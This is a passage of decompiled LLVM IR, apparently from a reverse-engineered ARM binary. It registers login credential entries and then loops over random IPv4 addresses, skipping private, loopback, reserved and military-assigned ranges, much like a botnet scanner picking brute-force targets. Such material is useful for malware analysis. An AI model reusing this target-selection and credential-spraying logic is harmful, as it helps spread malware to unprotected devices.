  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e868 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a8b8.204 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a8c8.208 to i32), i32 12)
  store i32 ptrtoint ([4 x i8]* @global_var_1a8d0.210 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a86c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_e878 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1a8d0.210 to i32), i32 ptrtoint (i32* @global_var_1a86c.172 to i32), i32 3)
  %v2_e880 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_e880, i32* %r0.global-to-local, align 4
  %v1_102b8 = add i32 %v2_e880, 20
  %v1_1030c = add i32 %v2_e880, 16
  %v2_1030c = inttoptr i32 %v1_1030c to i32*
  %v1_10320 = add i32 %v2_e880, 9
  %v2_10320 = inttoptr i32 %v1_10320 to i8*
  %v2_105b0 = ptrtoint i32* %stack_var_-40 to i32
  %v2_105fc = ptrtoint i32* %stack_var_-68 to i32
  %v2_10600 = ptrtoint i32* %stack_var_-224 to i32
  %v2_10604 = ptrtoint i32* %stack_var_-352 to i32
  %v2_10f64 = ptrtoint i32* %stack_var_-45 to i32
  %v2_10f6c = ptrtoint i32* %stack_var_-88 to i32
  %v2_10f74 = ptrtoint i32* %stack_var_-77 to i32
  %v2_10df4 = ptrtoint i32* %stack_var_-60 to i32
  %v2_111d0 = ptrtoint i32* %stack_var_-280 to i32
  %v2_11298 = ptrtoint i32* %stack_var_-96 to i32
  %v2_112e8 = ptrtoint i32* %stack_var_-42 to i32
  %v1_103a0 = add i32 %v2_e880, 12
  %v2_103a0 = inttoptr i32 %v1_103a0 to i32*
  br label %dec_label_pc_e888

dec_label_pc_e888:                                ; preds = %dec_label_pc_10798, %dec_label_pc_e654
  %v2_e88c = load i32, i32* @global_var_23280.136, align 4
  store i32 %v2_e88c, i32* %r1.global-to-local, align 4
  %v0_e890 = load i32, i32* @fp, align 4
  %v3_e890 = icmp uge i32 %v0_e890, %v2_e88c
  store i1 %v3_e890, i1* %cpsr_c.global-to-local, align 1
  %v9_e890 = icmp eq i32 %v0_e890, %v2_e88c
  store i1 %v9_e890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e890, label %dec_label_pc_102a8, label %dec_label_pc_e89c

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e888
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_e8a4

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_101c4, %dec_label_pc_e89c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  store i32 0, i32* %stack_var_-88, align 4
  %v0_e8b8 = call i32 @rand_next()
  %v1_e8b8 = trunc i32 %v0_e8b8 to i16
  store i32 %v0_e8b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_23250.152 to i32), i32* %r4.global-to-local, align 4
  %v2_e8c4 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_e8c4, i32* %r3.global-to-local, align 4
  store i16 %v1_e8b8, i16* bitcast (i32* @global_var_23254.157 to i16*), align 4
  store i32 %v2_e8c4, i32* @global_var_2325c.211, align 4
  br label %dec_label_pc_e8d0

dec_label_pc_e8d0:                                ; preds = %.thread651.thread, %dec_label_pc_e964, %dec_label_pc_e958, %dec_label_pc_e94c, %dec_label_pc_e940, %dec_label_pc_e934, %dec_label_pc_e928, %dec_label_pc_e91c, %dec_label_pc_e910, %dec_label_pc_e904, %dec_label_pc_e8f8, %bb1920, %dec_label_pc_10198, %dec_label_pc_10164, %dec_label_pc_10120, %bb1892, %dec_label_pc_1001c, %.thread599, %dec_label_pc_ffa8, %dec_label_pc_ff6c, %bb1860, %bb1853, %bb1848, %bb1843, %bb1837, %bb1832, %bb1826, %bb1821, %bb1816, %bb1811, %bb1806, %bb1801, %bb1796, %bb1791, %bb1786, %.thread471, %dec_label_pc_fb98, %.thread465, %dec_label_pc_fb54, %.thread459, %dec_label_pc_fb28, %.thread455, %dec_label_pc_fb00, %dec_label_pc_faf0, %.thread450, %.thread446, %.thread442, %.thread438, %bb1774, %bb1767, %bb1762, %bb1754, %bb1748, %bb1741, %bb1736, %bb1731, %bb1726, %bb1721, %bb1716, %.thread365, %bb1708, %bb1704, %bb1701, %bb1695, %bb1687, %bb1684, %bb1680, %bb1672, %bb1665, %bb1660, %bb1657, %bb1653, %bb1649, %bb1641, %bb1634, %bb1629, %bb1624, %bb1622, %bb1618, %bb1611, %dec_label_pc_f470, %dec_label_pc_f460, %.thread245, %dec_label_pc_f420, %.thread239, %.thread235, %dec_label_pc_f3c8, %dec_label_pc_f3ac, %.thread228, %.thread224, %.thread220, %dec_label_pc_f09c, %dec_label_pc_ee6c, %dec_label_pc_edac, %.thread114, %dec_label_pc_ecc8, %dec_label_pc_eca4, %.thread91, %dec_label_pc_ec24, %dec_label_pc_ec00, %.thread75, %.thread71, %dec_label_pc_eb84, %dec_label_pc_eb40, %.thread60, %dec_label_pc_eaf4, %dec_label_pc_eadc, %dec_label_pc_eaa8, %.thread48, %.thread44, %.thread40, %dec_label_pc_ea58, %.thread35, %.thread31, %dec_label_pc_e9d0, %dec_label_pc_e9bc, %dec_label_pc_e9a8, %dec_label_pc_101bc, %dec_label_pc_10190, %bb1914, %bb1913, %dec_label_pc_10144, %dec_label_pc_100fc, %dec_label_pc_100d8, %dec_label_pc_100b8, %dec_label_pc_10094, %bb1887, %dec_label_pc_ffec, %dec_label_pc_ffd0, %dec_label_pc_ff8c, %dec_label_pc_ff50, %dec_label_pc_ff30, %dec_label_pc_ff0c, %bb1854, %bb1827, %bb1802, %bb1782, %bb1781, %bb1776, %bb1775, %bb1742, %bb1711, %bb1635, %bb1597, %dec_label_pc_f344, %dec_label_pc_f320, %dec_label_pc_f300, %dec_label_pc_f2e0, %dec_label_pc_f2b0, %dec_label_pc_f290, %dec_label_pc_f270, %dec_label_pc_f258, %dec_label_pc_f230, %dec_label_pc_f218, %dec_label_pc_f1f8, %dec_label_pc_f1d4, %dec_label_pc_f1ac, %dec_label_pc_f190, %dec_label_pc_f170, %dec_label_pc_f150, %dec_label_pc_f130, %dec_label_pc_f110, %dec_label_pc_f0fc, %bb1401, %bb1398, %bb1395, %bb1386, %bb1383, %dec_label_pc_e970, %bb1380, %bb1379, %bb1378, %bb1377, %bb1376, %bb1375, %bb1374, %bb1373, %bb1372, %bb1371, %bb1370, %dec_label_pc_f0d8, %dec_label_pc_f0b8, %dec_label_pc_f080, %dec_label_pc_f064, %dec_label_pc_f048, %dec_label_pc_f028, %dec_label_pc_f014, %dec_label_pc_eff8, %dec_label_pc_efd4, %dec_label_pc_efa8, %dec_label_pc_ef7c, %dec_label_pc_ef50, %dec_label_pc_ef20, %dec_label_pc_eefc, %dec_label_pc_eed4, %dec_label_pc_eeb8, %dec_label_pc_ee90, %dec_label_pc_ee48, %dec_label_pc_ee1c, %dec_label_pc_edfc, %dec_label_pc_eda4, %dec_label_pc_ed74, %bb1459, %bb1456, %bb1453, %bb1444, %bb1441, %bb1438, %bb1429, %bb1426, %bb1425, %bb1422, %bb1415, %bb1408, %dec_label_pc_e8a4
  %v0_e8d0 = call i32 @rand_next()
  store i32 %v0_e8d0, i32* %r0.global-to-local, align 4
  %v1_e8d4 = urem i32 %v0_e8d0, 256
  store i32 %v1_e8d4, i32* %r1.global-to-local, align 4
  %v3_e8d8 = udiv i32 %v0_e8d0, 256
  store i32 %v3_e8d8, i32* %r3.global-to-local, align 4
  %v3_e8dc = udiv i32 %v0_e8d0, 65536
  store i32 %v3_e8dc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8e0 = icmp eq i32 %v1_e8d4, 0
  store i1 %v2_e8e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8e0, label %bb1370, label %bb1369

bb1369:                                           ; preds = %dec_label_pc_e8d0
  %v3_e8e4 = icmp ugt i32 %v1_e8d4, 126
  store i1 %v3_e8e4, i1* %cpsr_c.global-to-local, align 1
  %v8_e8e4 = icmp eq i32 %v1_e8d4, 127
  store i1 %v8_e8e4, i1* %cpsr_z.global-to-local, align 1
  br label %bb1370

bb1370:                                           ; preds = %dec_label_pc_e8d0, %bb1369
  %v0_e8f4 = phi i1 [ true, %dec_label_pc_e8d0 ], [ %v8_e8e4, %bb1369 ]
  %v1_e8e8 = urem i32 %v3_e8d8, 256
  store i32 %v1_e8e8, i32* %ip.global-to-local, align 4
  %v1_e8ec = urem i32 %v3_e8dc, 256
  store i32 %v1_e8ec, i32* %r2.global-to-local, align 4
  %v1_e8f0 = and i32 %v0_e8d0, 8388608
  %v2_e8f0 = icmp ne i32 %v1_e8f0, 0
  store i1 %v2_e8f0, i1* %cpsr_c.global-to-local, align 1
  %v3_e8f0 = udiv i32 %v0_e8d0, 16777216
  store i32 %v3_e8f0, i32* %r0.global-to-local, align 4
  br i1 %v0_e8f4, label %dec_label_pc_e8d0, label %dec_label_pc_e8f8

dec_label_pc_e8f8:                                ; preds = %bb1370
  %v2_e8f8 = icmp ugt i32 %v1_e8d4, 14
  store i1 %v2_e8f8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8f8 = icmp eq i32 %v1_e8d4, 15
  store i1 %v7_e8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8f8, label %dec_label_pc_e8d0, label %bb1371

bb1371:                                           ; preds = %dec_label_pc_e8f8
  %v3_e8fc = icmp ugt i32 %v1_e8d4, 2
  store i1 %v3_e8fc, i1* %cpsr_c.global-to-local, align 1
  %v8_e8fc = icmp eq i32 %v1_e8d4, 3
  store i1 %v8_e8fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8fc, label %dec_label_pc_e8d0, label %dec_label_pc_e904

dec_label_pc_e904:                                ; preds = %bb1371
  %v2_e904 = icmp ugt i32 %v1_e8d4, 9
  store i1 %v2_e904, i1* %cpsr_c.global-to-local, align 1
  %v7_e904 = icmp eq i32 %v1_e8d4, 10
  store i1 %v7_e904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e904, label %dec_label_pc_e8d0, label %bb1372

bb1372:                                           ; preds = %dec_label_pc_e904
  %v3_e908 = icmp ugt i32 %v1_e8d4, 55
  store i1 %v3_e908, i1* %cpsr_c.global-to-local, align 1
  %v8_e908 = icmp eq i32 %v1_e8d4, 56
  store i1 %v8_e908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e908, label %dec_label_pc_e8d0, label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %bb1372
  %v2_e910 = icmp ugt i32 %v1_e8d4, 48
  store i1 %v2_e910, i1* %cpsr_c.global-to-local, align 1
  %v7_e910 = icmp eq i32 %v1_e8d4, 49
  store i1 %v7_e910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e910, label %dec_label_pc_e8d0, label %bb1373

bb1373:                                           ; preds = %dec_label_pc_e910
  %v3_e914 = icmp ugt i32 %v1_e8d4, 24
  store i1 %v3_e914, i1* %cpsr_c.global-to-local, align 1
  %v8_e914 = icmp eq i32 %v1_e8d4, 25
  store i1 %v8_e914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e914, label %dec_label_pc_e8d0, label %dec_label_pc_e91c

dec_label_pc_e91c:                                ; preds = %bb1373
  %v2_e91c = icmp ugt i32 %v1_e8d4, 136
  store i1 %v2_e91c, i1* %cpsr_c.global-to-local, align 1
  %v7_e91c = icmp eq i32 %v1_e8d4, 137
  store i1 %v7_e91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e91c, label %dec_label_pc_e8d0, label %bb1374

bb1374:                                           ; preds = %dec_label_pc_e91c
  %v3_e920 = icmp ugt i32 %v1_e8d4, 49
  store i1 %v3_e920, i1* %cpsr_c.global-to-local, align 1
  %v8_e920 = icmp eq i32 %v1_e8d4, 50
  store i1 %v8_e920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e920, label %dec_label_pc_e8d0, label %dec_label_pc_e928

dec_label_pc_e928:                                ; preds = %bb1374
  %v2_e928 = icmp ugt i32 %v1_e8d4, 6
  store i1 %v2_e928, i1* %cpsr_c.global-to-local, align 1
  %v7_e928 = icmp eq i32 %v1_e8d4, 7
  store i1 %v7_e928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e928, label %dec_label_pc_e8d0, label %bb1375

bb1375:                                           ; preds = %dec_label_pc_e928
  %v3_e92c = icmp ugt i32 %v1_e8d4, 5
  store i1 %v3_e92c, i1* %cpsr_c.global-to-local, align 1
  %v8_e92c = icmp eq i32 %v1_e8d4, 6
  store i1 %v8_e92c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e92c, label %dec_label_pc_e8d0, label %dec_label_pc_e934

dec_label_pc_e934:                                ; preds = %bb1375
  %v2_e934 = icmp ugt i32 %v1_e8d4, 20
  store i1 %v2_e934, i1* %cpsr_c.global-to-local, align 1
  %v7_e934 = icmp eq i32 %v1_e8d4, 21
  store i1 %v7_e934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e934, label %dec_label_pc_e8d0, label %bb1376

bb1376:                                           ; preds = %dec_label_pc_e934
  %v3_e938 = icmp ugt i32 %v1_e8d4, 10
  store i1 %v3_e938, i1* %cpsr_c.global-to-local, align 1
  %v8_e938 = icmp eq i32 %v1_e8d4, 11
  store i1 %v8_e938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e938, label %dec_label_pc_e8d0, label %dec_label_pc_e940

dec_label_pc_e940:                                ; preds = %bb1376
  %v2_e940 = icmp ugt i32 %v1_e8d4, 25
  store i1 %v2_e940, i1* %cpsr_c.global-to-local, align 1
  %v7_e940 = icmp eq i32 %v1_e8d4, 26
  store i1 %v7_e940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e940, label %dec_label_pc_e8d0, label %bb1377

bb1377:                                           ; preds = %dec_label_pc_e940
  %v3_e944 = icmp ugt i32 %v1_e8d4, 21
  store i1 %v3_e944, i1* %cpsr_c.global-to-local, align 1
  %v8_e944 = icmp eq i32 %v1_e8d4, 22
  store i1 %v8_e944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e944, label %dec_label_pc_e8d0, label %dec_label_pc_e94c

dec_label_pc_e94c:                                ; preds = %bb1377
  %v2_e94c = icmp ugt i32 %v1_e8d4, 28
  store i1 %v2_e94c, i1* %cpsr_c.global-to-local, align 1
  %v7_e94c = icmp eq i32 %v1_e8d4, 29
  store i1 %v7_e94c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e94c, label %dec_label_pc_e8d0, label %bb1378

bb1378:                                           ; preds = %dec_label_pc_e94c
  %v3_e950 = icmp ugt i32 %v1_e8d4, 27
  store i1 %v3_e950, i1* %cpsr_c.global-to-local, align 1
  %v8_e950 = icmp eq i32 %v1_e8d4, 28
  store i1 %v8_e950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e950, label %dec_label_pc_e8d0, label %dec_label_pc_e958

dec_label_pc_e958:                                ; preds = %bb1378
  %v2_e958 = icmp ugt i32 %v1_e8d4, 32
  store i1 %v2_e958, i1* %cpsr_c.global-to-local, align 1
  %v7_e958 = icmp eq i32 %v1_e8d4, 33
  store i1 %v7_e958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e958, label %dec_label_pc_e8d0, label %bb1379

bb1379:                                           ; preds = %dec_label_pc_e958
  %v3_e95c = icmp ugt i32 %v1_e8d4, 29
  store i1 %v3_e95c, i1* %cpsr_c.global-to-local, align 1
  %v8_e95c = icmp eq i32 %v1_e8d4, 30
  store i1 %v8_e95c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e95c, label %dec_label_pc_e8d0, label %dec_label_pc_e964

dec_label_pc_e964:                                ; preds = %bb1379
  %v2_e964 = icmp ugt i32 %v1_e8d4, 213
  store i1 %v2_e964, i1* %cpsr_c.global-to-local, align 1
  %v7_e964 = icmp eq i32 %v1_e8d4, 214
  store i1 %v7_e964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e964, label %dec_label_pc_e8d0, label %bb1380

bb1380:                                           ; preds = %dec_label_pc_e964
  %v3_e968 = icmp ugt i32 %v1_e8d4, 54
  store i1 %v3_e968, i1* %cpsr_c.global-to-local, align 1
  %v8_e968 = icmp eq i32 %v1_e8d4, 55
  store i1 %v8_e968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e968, label %dec_label_pc_e8d0, label %dec_label_pc_e970

dec_label_pc_e970:                                ; preds = %bb1380
  %v2_e970 = icmp ugt i32 %v1_e8d4, 214
  store i1 %v2_e970, i1* %cpsr_c.global-to-local, align 1
  %v7_e970 = icmp eq i32 %v1_e8d4, 215
  store i1 %v7_e970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e970, label %dec_label_pc_e8d0, label %dec_label_pc_e978

dec_label_pc_e978:                                ; preds = %dec_label_pc_e970
  %v7_e978 = icmp eq i32 %v1_e8d4, 192
  %.1975 = zext i1 %v7_e978 to i32
  store i32 %.1975, i32* @r5, align 4
  %v2_e984 = icmp ugt i32 %v1_e8e8, 167
  store i1 %v2_e984, i1* %cpsr_c.global-to-local, align 1
  %v7_e984 = icmp eq i32 %v1_e8e8, 168
  store i1 %v7_e984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e984, label %bb1383, label %dec_label_pc_e990

bb1383:                                           ; preds = %dec_label_pc_e978
  %v2_e978 = icmp ugt i32 %v1_e8d4, 191
  store i1 %v2_e978, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e978, label %dec_label_pc_e8d0, label %dec_label_pc_e990

dec_label_pc_e990:                                ; preds = %dec_label_pc_e978, %bb1383
  %v7_e990 = icmp eq i32 %v1_e8d4, 146
  %.1976 = zext i1 %v7_e990 to i32
  %v2_e99c = icmp ugt i32 %v1_e8e8, 16
  store i1 %v2_e99c, i1* %cpsr_c.global-to-local, align 1
  %v7_e99c = icmp eq i32 %v1_e8e8, 17
  store i1 %v7_e99c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e99c, label %bb1386, label %dec_label_pc_e9a8

bb1386:                                           ; preds = %dec_label_pc_e990
  %v2_e990 = icmp ugt i32 %v1_e8d4, 145
  store i1 %v2_e990, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e990, label %dec_label_pc_e8d0, label %dec_label_pc_e9a8

dec_label_pc_e9a8:                                ; preds = %dec_label_pc_e990, %bb1386
  %v2_e9a8 = icmp ugt i32 %v1_e8e8, 79
  store i1 %v2_e9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9a8 = icmp eq i32 %v1_e8e8, 80
  %.1977 = zext i1 %v7_e9a8 to i32
  %v2_e9b4 = and i32 %.1977, %.1976
  %v4_e9b4 = icmp eq i32 %v2_e9b4, 0
  store i1 %v4_e9b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_e9b4, label %dec_label_pc_e9bc, label %dec_label_pc_e8d0

dec_label_pc_e9bc:                                ; preds = %dec_label_pc_e9a8
  %v2_e9bc = icmp ugt i32 %v1_e8e8, 97
  store i1 %v2_e9bc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9bc = icmp eq i32 %v1_e8e8, 98
  %.1978 = zext i1 %v7_e9bc to i32
  store i32 %.1978, i32* @r8, align 4
  %v2_e9c8 = and i32 %.1978, %.1976
  %v4_e9c8 = icmp eq i32 %v2_e9c8, 0
  store i1 %v4_e9c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_e9c8, label %dec_label_pc_e9d0, label %dec_label_pc_e8d0

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e9bc
  %v2_e9d0 = icmp ugt i32 %v1_e8e8, 153
  store i1 %v2_e9d0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9d0 = icmp eq i32 %v1_e8e8, 154
  %.1979 = zext i1 %v7_e9d0 to i32
  %v2_e9dc = and i32 %.1979, %.1976
  %v4_e9dc = icmp eq i32 %v2_e9dc, 0
  store i1 %v4_e9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_e9dc, label %dec_label_pc_e9e4, label %dec_label_pc_e8d0

dec_label_pc_e9e4:                                ; preds = %dec_label_pc_e9d0
  %v7_e9e4 = icmp eq i32 %v1_e8d4, 147
  %.1980 = zext i1 %v7_e9e4 to i32
  %v2_e9f0 = icmp ugt i32 %v1_e8e8, 158
  store i1 %v2_e9f0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f0 = icmp eq i32 %v1_e8e8, 159
  store i1 %v7_e9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f0, label %bb1395, label %dec_label_pc_e9fc

bb1395:                                           ; preds = %dec_label_pc_e9e4
  %v2_e9e4 = icmp ugt i32 %v1_e8d4, 146
  store i1 %v2_e9e4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e4, label %dec_label_pc_e8d0, label %dec_label_pc_e9fc

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e9e4, %bb1395
  %v2_e9fc = icmp ugt i32 %v1_e8e8, 113
  %v7_e9fc = icmp eq i32 %v1_e8e8, 114
  %.1981 = zext i1 %v7_e9fc to i32
  %v2_ea08 = icmp ugt i32 %v1_e8d4, 147
  store i1 %v2_ea08, i1* %cpsr_c.global-to-local, align 1
  %v7_ea08 = icmp eq i32 %v1_e8d4, 148
  store i1 %v7_ea08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea08, label %bb1398, label %dec_label_pc_ea18

bb1398:                                           ; preds = %dec_label_pc_e9fc
  store i1 %v2_e9fc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9fc, label %dec_label_pc_e8d0, label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %dec_label_pc_e9fc, %bb1398
  %v7_ea18 = icmp eq i32 %v1_e8d4, 150
  %.1982 = zext i1 %v7_ea18 to i32
  store i32 %.1982, i32* %r4.global-to-local, align 4
  %v2_ea24 = icmp ugt i32 %v1_e8e8, 124
  store i1 %v2_ea24, i1* %cpsr_c.global-to-local, align 1
  %v7_ea24 = icmp eq i32 %v1_e8e8, 125
  store i1 %v7_ea24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea24, label %bb1401, label %dec_label_pc_ea30

bb1401:                                           ; preds = %dec_label_pc_ea18
  %v2_ea18 = icmp ugt i32 %v1_e8d4, 149
  store i1 %v2_ea18, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ea18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea18, label %dec_label_pc_e8d0, label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %dec_label_pc_ea18, %bb1401
  %v2_ea30 = icmp ugt i32 %v1_e8e8, 132
  store i1 %v2_ea30, i1* %cpsr_c.global-to-local, align 1
  %v7_ea30 = icmp eq i32 %v1_e8e8, 133
  store i1 %v7_ea30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea30, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_ea30
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea44

.thread31:                                        ; preds = %dec_label_pc_ea30
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea3c = icmp eq i1 %v7_ea18, false
  store i1 %v2_ea3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea3c, label %dec_label_pc_ea44, label %dec_label_pc_e8d0

dec_label_pc_ea44:                                ; preds = %.thread32, %.thread31
  %v2_ea44 = icmp ugt i32 %v1_e8e8, 143
  store i1 %v2_ea44, i1* %cpsr_c.global-to-local, align 1
  %v7_ea44 = icmp eq i32 %v1_e8e8, 144
  store i1 %v7_ea44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea44, label %.thread35, label %.thread36

.thread36:                                        ; preds = %dec_label_pc_ea44
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea58

.thread35:                                        ; preds = %dec_label_pc_ea44
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea50 = icmp eq i1 %v7_ea18, false
  store i1 %v2_ea50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea50, label %dec_label_pc_ea58, label %dec_label_pc_e8d0

dec_label_pc_ea58:                                ; preds = %.thread36, %.thread35
  %v2_ea58 = icmp ugt i32 %v1_e8e8, 148
  store i1 %v2_ea58, i1* %cpsr_c.global-to-local, align 1
  %v7_ea58 = icmp eq i32 %v1_e8e8, 149
  %.1983 = zext i1 %v7_ea58 to i32
  %v2_ea64 = and i32 %.1983, %.1982
  %v4_ea64 = icmp eq i32 %v2_ea64, 0
  store i1 %v4_ea64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ea64, label %dec_label_pc_ea6c, label %dec_label_pc_e8d0

dec_label_pc_ea6c:                                ; preds = %dec_label_pc_ea58
  %v2_ea6c = icmp ugt i32 %v1_e8e8, 156
  store i1 %v2_ea6c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea6c = icmp eq i32 %v1_e8e8, 157
  store i1 %v7_ea6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea6c, label %.thread40, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_ea6c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea80

.thread40:                                        ; preds = %dec_label_pc_ea6c
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea78 = icmp eq i1 %v7_ea18, false
  store i1 %v2_ea78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea78, label %dec_label_pc_ea80, label %dec_label_pc_e8d0

dec_label_pc_ea80:                                ; preds = %.thread41, %.thread40
  %v2_ea80 = icmp ugt i32 %v1_e8e8, 183
  store i1 %v2_ea80, i1* %cpsr_c.global-to-local, align 1
  %v7_ea80 = icmp eq i32 %v1_e8e8, 184
  store i1 %v7_ea80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea80, label %.thread44, label %.thread45

.thread45:                                        ; preds = %dec_label_pc_ea80
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea94

.thread44:                                        ; preds = %dec_label_pc_ea80
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea8c = icmp eq i1 %v7_ea18, false
  store i1 %v2_ea8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea8c, label %dec_label_pc_ea94, label %dec_label_pc_e8d0

dec_label_pc_ea94:                                ; preds = %.thread45, %.thread44
  %v2_ea94 = icmp ugt i32 %v1_e8e8, 189
  store i1 %v2_ea94, i1* %cpsr_c.global-to-local, align 1
  %v7_ea94 = icmp eq i32 %v1_e8e8, 190
  store i1 %v7_ea94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea94, label %.thread48, label %.thread49

.thread49:                                        ; preds = %dec_label_pc_ea94
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eaa8

.thread48:                                        ; preds = %dec_label_pc_ea94
  store i32 %.1982, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eaa0 = icmp eq i1 %v7_ea18, false
  store i1 %v2_eaa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eaa0, label %dec_label_pc_eaa8, label %dec_label_pc_e8d0

dec_label_pc_eaa8:                                ; preds = %.thread49, %.thread48
  %v2_eaa8 = icmp ugt i32 %v1_e8e8, 195
  store i1 %v2_eaa8, i1* %cpsr_c.global-to-local, align 1
  %v7_eaa8 = icmp eq i32 %v1_e8e8, 196
  %.1984 = zext i1 %v7_eaa8 to i32
  store i32 %.1984, i32* %r3.global-to-local, align 4
  %v2_eab4 = and i32 %.1984, %.1982
  %v4_eab4 = icmp eq i32 %v2_eab4, 0
  store i1 %v4_eab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_eab4, label %dec_label_pc_eac0, label %dec_label_pc_e8d0

dec_label_pc_eac0:                                ; preds = %dec_label_pc_eaa8
  %v7_eac0 = icmp eq i32 %v1_e8d4, 152
  %.1985 = zext i1 %v7_eac0 to i32
  %v2_eacc = icmp ugt i32 %v1_e8e8, 81
  store i1 %v2_eacc, i1* %cpsr_c.global-to-local, align 1
  %v7_eacc = icmp eq i32 %v1_e8e8, 82
